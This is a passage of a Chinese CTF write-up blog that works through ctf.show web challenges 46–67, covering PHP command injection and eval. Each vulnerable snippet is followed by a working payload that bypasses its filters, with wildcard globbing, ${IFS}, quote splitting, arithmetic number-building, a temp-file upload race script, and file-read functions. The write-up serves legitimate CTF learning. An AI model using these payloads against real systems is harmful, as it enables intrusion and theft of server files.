class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把数字进行了过滤，还有通配符*也进行了过滤，所以我们可以改用？进行匹配！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><hr /><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了几个读取文件的命令！我们可以继续用上一个payload！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><p>下面补充一波知识点！</p><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>grep test *file<br>strings</p></blockquote><hr /><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>继续上一个命令。再补充一个命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;tac%09fla?.php||</span><br><span class="line">或·</span><br><span class="line">&#x2F;?c&#x3D;tac%09fl&#39;ag&#39;.php%0A</span><br><span class="line">这个命令web47~49通杀</span><br></pre></td></tr></table></figure><hr /><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题继续使用上一题payload！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fl%27ag%27.php%0a</span><br><span class="line">或</span><br><span class="line">&#x2F;?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><hr /><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把%进行了过滤，我们可以使用\进行绕过！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac&lt;&gt;fla\g.php||</span><br><span class="line">或</span><br><span class="line">?c&#x3D;tac&lt;fla&#39;g&#39;.php%0a</span><br></pre></td></tr></table></figure><hr /><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次对tac进行了过滤！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里过滤了尖括号，但是有$符！用 ${IFS}代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;fla&#x2F;g.php||</span><br><span class="line">或</span><br><span class="line">?c&#x3D;ls$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;||  （查看有flag）</span><br><span class="line">?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag%0a</span><br></pre></td></tr></table></figure><hr /><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次没有了回显，所以我们把||去掉即可！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;ca\t$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><hr /><h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次过滤了很多字母，并且不能用\这个来进行分割了，但是还有一个grep可以使用</p><blockquote><p>grep flag flag.php 查找flag.php文件中含有flag的那一行，并且打印出来</p></blockquote><p>所以此时我们可以开始构造payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br><span class="line">或</span><br><span class="line">?c&#x3D;&#x2F;bin&#x2F;?at$&#123;IFS&#125;f???????%0a</span><br><span class="line">这里其实cat命令</span><br><span class="line">?c&#x3D;paste$&#123;IFS&#125;fl?g.php%0a</span><br><span class="line">paste 指令会把每个文件以列对列的方式，一列列地加以合并。</span><br><span class="line">?c&#x3D;uniq$&#123;IFS&#125;f???????</span><br><span class="line">uniq 可检查文本文件中重复出现的行列</span><br><span class="line">这三个需要进行查看源代码！</span><br></pre></td></tr></table></figure><hr /><h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</p></blockquote><p>所以这里我们可以使用base64命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????????%0a</span><br><span class="line">或者</span><br><span class="line">?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????</span><br><span class="line">?c&#x3D;&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</span><br><span class="line">把flag.php压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来</span><br></pre></td></tr></table></figure><hr /><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里连字母数字都给过滤了，所以上一个payload是不能够使用的！<br>此时接着看大师傅的博客！<br>发现是可以上传一个post包，这个文件会被保存在临时文件中/tmp/xx，此时我们可以用？进行匹配！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://aafaf838-299e-408c-a8ba-9817b0d37714.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">url += <span class="string">&#x27;?c=. /???/????????[@-[]&#x27;</span><span class="comment">#构造url</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.post(url,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;dota.txt&quot;</span>,<span class="string">&quot;cat flag.php&quot;</span>)&#125;)<span class="comment">#以post进行发包</span></span><br><span class="line">    flag = r.text.split(<span class="string">&quot;ctfshow&quot;</span>)<span class="comment">#split() 通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag)&gt;<span class="number">1</span>:<span class="comment">#说明flag获得值了！</span></span><br><span class="line">        print(r.text)<span class="comment">#打印flag</span></span><br><span class="line">        <span class="keyword">break</span><span class="comment">#跳出循环</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414160036177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里连数字都给过滤了，可以利用$和()进行构造数字。提示为36，所以我们需要构造出36这个数字！<br>$(()) 代表做一次运算，因为里面为空，也表示值为0<br>$ ((~ $ (()))) 对0作取反运算，值为-1<br>$ (( $ ((~ $ (()))) $ ((~ $ (()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2<br>$ ((~ $ (( $ ((~ $ (()))) $ ((~ $ (()))))))) 再对-2做一次取反得到1，所以值为1</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">harker = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line">print(harker)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>然后查看页面源代码！</p><hr /><h1 id="web58-web65"><a href="#web58-web65" class="headerlink" title="web58~web65"></a>web58~web65</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以进行直接蚁剑链接gethell！<br><img src="https://img-blog.csdnimg.cn/20210414161801918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码没有改变！<br>直接蚁剑链接！<br>应该是考绕disable_functions！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><hr /><h2 id="web60-web65"><a href="#web60-web65" class="headerlink" title="web60~web65"></a>web60~web65</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个show_source是没有被禁止的，所以继续上一个脚本！</p><blockquote><ol><li>file_get_contents()</li><li>highlight_file()</li><li>show_source()</li><li>fgets()</li><li>file()</li><li>readfile()</li></ol></blockquote><p>上面是一些读取文件的函数！这些函数都是可以使用的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post：c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>下面再补充一种做法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）</span><br><span class="line">     copy()</span><br><span class="line">     rename()</span><br><span class="line">&#x2F;&#x2F;用法：</span><br><span class="line">     copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);            </span><br><span class="line">     rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br></pre></td></tr></table></figure><hr /><h1 id="66"><a href="#66" class="headerlink" title="66"></a>66</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就不能再用show_source函数了！<br>不过这里要用highlight_file()函数是可以使用的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414190149111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以flag应该转移地方了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;print_r(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414190858448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure><hr /><h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><figure class="highlight php"><table><tr><td 